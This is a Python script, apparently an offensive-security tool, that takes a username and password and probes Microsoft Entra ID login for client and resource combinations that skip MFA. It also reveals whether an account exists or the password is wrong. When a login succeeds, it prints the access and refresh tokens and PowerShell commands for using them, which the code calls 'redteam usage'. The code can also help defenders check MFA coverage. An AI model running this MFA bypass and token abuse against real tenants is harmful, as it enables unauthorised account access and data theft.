#! /usr/bin/env python3
# -*- coding: utf-8 -*- 
r''' 
    	Copyright 2024 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program. If not, see <http://www.gnu.org/licenses/>.
        
        File name EntraIDMFAPoker.py
        written by Tijl Deneut

        This script attempts to authenticate in different ways to a Managed Entra ID tenant
        without the use of any MFA parameters. 
        --> This is also functional if the account requires MFA but has no methods registerd
        -> Also included are some commands for abusing the received Access Token to authenticate
            via PowerShell (AzureAD, AzAccount or MgGraph), all of them can be used to retrieve accounts

        Based on and shout out to RoadRecon: https://github.com/dirkjanm/ROADtools
        -> roadrecon auth, roadrecon gather, roadrecon gui
'''

WELLKNOWN_RESOURCES = {
    'aadgraph': 'https://graph.windows.net/',
    'msgraph': 'https://graph.microsoft.com/',
    'azurerm': 'https://management.core.windows.net/',
    'outlook': 'https://outlook.office.com/',
    'devicereg': 'urn:ms-drs:enterpriseregistration.windows.net'
}

WELLKNOWN_CLIENTS = {  ## Or actually Application ID's, Full list: https://learn.microsoft.com/en-us/troubleshoot/azure/entra/entra-id/governance/verify-first-party-apps-sign-in#application-ids-of-commonly-used-microsoft-applications
    'aadps': '1b730954-1685-4b74-9bfd-dac224a7b894',    ## Azure Active Directory Powershell
    'azcli': '04b07795-8ddb-461a-bbee-02f9e1bf7b46',    ## Microsoft Azure CLI
    'azps': '1950a258-227b-4e31-a9cf-717495945fc2',     ## Microsoft Azure Powershell
    'edge': 'ecd6b820-32c2-49b6-98a6-444530e5a77a',     ## Microsoft Edge
    'broker': '29d9ed98-a469-4536-ade2-f981bc1d605e',   ## Microsoft Authentication Broker
    'teams': '1fec8e78-bce4-4aaf-ab1b-5451cc387264'     ## Microsoft Teams
}

import base64, json, time, argparse, getpass, sys
import requests ## python3 -m pip install requests

sBaseURL = 'https://login.microsoftonline.com/common'

def tryEntraLogin(lstData, resource = None, client = None, boolVerbose = False):
    if resource: lstData['resource'] = WELLKNOWN_RESOURCES[resource]
    if client: lstData['client_id'] = WELLKNOWN_CLIENTS[client]
    oResponse = requests.post(f'{sBaseURL}/oauth2/token', data=lstData)
    jResp = oResponse.json()
    if oResponse.status_code != 200:
        sDescr = jResp['error_description']
        if 'multi-factor authentication' in sDescr: 
            if boolVerbose: print('[-] Credentials are GOOD, but resource {}, client {}, account {} require MFA'.format(lstData['resource'], lstData['client_id'], lstData['username']))
            return None
        print('[-] Login failed, please alter the parameters:')
        if 'does not exist in' in sDescr: print('    Account {} does not exist.'.format(lstData['username']))
        elif 'validating credentials due to invalid' in sDescr: print('    Account {} was found but the provided password is wrong.'.format(lstData['username']))
        else: print(sDescr)
        exit()
    else: return jResp

def showData(jResp, boolShowTips):
    def getResource(sAud): return list(WELLKNOWN_RESOURCES.keys())[list(WELLKNOWN_RESOURCES.values()).index(sAud)]
    sAccessToken = jResp['access_token']
    jJWT = json.loads(base64.b64decode(sAccessToken.split('.')[1]+'==='))
    sAud = jJWT['aud'] if 'aud' in jJWT else None
    sResource = getResource(sAud) if sAud else None
    sFname = jJWT['given_name'] if 'given_name' in jJWT else None
    sLname = jJWT['family_name'] if 'family_name' in jJWT else None
    sSID = jJWT['onprem_sid'] if 'onprem_sid' in jJWT else None
    sTenantID = jJWT['tid'] if 'tid' in jJWT else None  
    sUnique = jJWT['unique_name'] if 'unique_name' in jJWT else None
    sUPN = jJWT['upn'] if 'upn' in jJWT else None
    sOID = jJWT['oid']
    if not boolShowTips:
        print(f'[+] Successfully authenticated without MFA, for more details: rerun with options "-r {sResource} -s"')
    print(f'[+] Account:        {sUPN}')
    print(f'    Tenant ID:      {sTenantID}')
    print(f'    Account ID/OID: {sOID}')
    if sFname and sLname: print(f'    Full name:      {sFname} {sLname}')
    if sSID: print(f'    Onprem SID:     {sSID}')
    if sUnique and sUnique != sUPN: print(f'    Unique Name:    {sUnique}')
    if boolShowTips: 
        print(f'    Access Token:   {sAccessToken}')
        print('    Refresh Token:  {}'.format(jResp['refresh_token']))

    if sAccessToken and sOID and sUPN and sTenantID and boolShowTips: 
        print('\nPlease try running, in order of preference:\n')
        print(f'Connect-AzureAD -TenantID {sTenantID} -AccountId {sOID} -AadAccessToken {sAccessToken} ## Requires Install-Module AzureAD, verify with "Get-AzureADTenantDetail | Format-List"')
        print('OR')
        print(f'Connect-AzAccount -Tenant {sTenantID} -AccountId {sOID} -AccessToken {sAccessToken} ## Requires Install-Module AZ, verify with "Get-Azcontext | Format-List"')
        print('OR')
        print(f'$AccToken = \'{sAccessToken}\'; $SecureToken = $AccToken | ConvertTo-SecureString -AsPlainText -Force; Connect-MgGraph -AccessToken $SecureToken; Get-MgContext ## Requires Install-Module Microsoft.Graph')
    exit()

def main():
    global WELLKNOWN_CLIENTS, WELLKNOWN_RESOURCES
    ## Banner
    sBanner = r'''
    [*****************************************************************************]
                              --- EntraID MFA poker ---
    This script verifies of MFA is enforced on all Entra ID resource & client types
          NOTE: There might be Rate Limiting/Auto Block of IP Addresses
    ______________________/-> Created By Tijl Deneut(c) <-\_______________________
    [*****************************************************************************]
    '''
    if len(sys.argv) < 2: print(sBanner)
    ## Defaults and parsing arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--username', help='Username, e.g. john.doe@contoso.com', default='', required=True)
    parser.add_argument('-p', '--password', help='Password, e.G. MyPass, will be prompted if omitted', default='')
    parser.add_argument('-r', '--resource', help='Initial resource type, default \'aadgraph\'', default='aadgraph')
    parser.add_argument('-c', '--client', help='Initial client type, default \'aadps\'', default='aadps')
    parser.add_argument('-s', '--showtips', help='If MFA is poked successfully, show redteam usage commands, default: False', action='store_true', default=False)
    parser.add_argument('-f', '--full', help='Walk resource ánd client types, default: resource only', action='store_true', default=False)
    parser.add_argument('-v', '--verbose', help='Verbosity; more info', action='store_true', default=False)
    args = parser.parse_args()

    if not args.password: args.password = getpass.getpass('[?] Please type password for {}: '.format(args.username))
    lstData = {'client_id' : WELLKNOWN_CLIENTS[args.client], 'grant_type' : 'password', 'resource' : WELLKNOWN_RESOURCES[args.resource], 'username' : args.username, 'password' : args.password}
    
    ## Standard attempt, AADPS on AADGRAPH
    jResp = tryEntraLogin(lstData, args.resource, args.client, args.verbose)
    if not jResp: ## Correct credentials, but MFA sits in the way
        print('[!] Credentials are GOOD, but for this resource, account {} requires MFA, trying other combinations now'.format(args.username))
        if not args.full: WELLKNOWN_CLIENTS = {args.client: WELLKNOWN_CLIENTS[args.client]}
        iCount = 0
        for sRes in WELLKNOWN_RESOURCES:
            for sCli in WELLKNOWN_CLIENTS: 
                iCount += 1
                jResp = tryEntraLogin(lstData, sRes, sCli, args.verbose)
                if jResp: 
                    print('[+] Success for resource type {} and client type {}'.format(WELLKNOWN_RESOURCES[sRes], sCli))
                    showData(jResp, args.showtips)
                print('    Trying next combo; {} out of {}'.format(iCount,len(WELLKNOWN_RESOURCES)*len(WELLKNOWN_CLIENTS)))
                time.sleep(2)
        print('[-] MFA was required for all verified resources. Congratulations, nothing more to do')
        exit()
    else: showData(jResp, args.showtips)
    exit()

if __name__ == '__main__':
	main()
